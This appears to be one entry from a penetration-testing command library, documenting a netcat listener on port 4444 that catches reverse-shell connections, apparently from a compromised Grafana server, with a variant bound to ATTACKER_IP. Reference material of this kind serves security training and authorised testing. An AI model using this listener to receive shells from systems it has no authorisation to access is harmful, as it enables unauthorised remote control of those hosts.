---
id: cmd-uuid-001
data: nc -n -lvp 4444
tags:
  - listener
  - reverse-shell
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.869Z'
verified: false
validated: true
submitted: true
---
# nc-listen-on-port-4444

## Command

```bash
nc -n -lvp 4444
```

## Description

This netcat command sets up a TCP listener on port 4444 to receive reverse shell connections, commonly used in exploitation scenarios to catch incoming shells from remote targets like the Grafana server in this attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | Do not perform DNS lookups | Yes |
| `-l` | Listen mode for inbound connections | Yes |
| `-v` | Verbose output to show connection details | Yes |
| `-p 4444` | Specify the port to listen on | Yes |

## Examples

### Basic Usage

```bash
nc -n -lvp 4444
```

### Advanced Usage

For a specific source IP restriction (if supported):

```bash
nc -n -lvp 4444 -s ATTACKER_IP
```

## Expected Output

Initial output: "listening on [any] 4444 ... connect to [attacker_ip] 4444 from [target_ip] [port] at [timestamp]". Upon connection, provides an interactive shell prompt from the remote host.

## Related

- [[Related Procedure: Setup-Netcat-Listener-for-Reverse-Shell]]
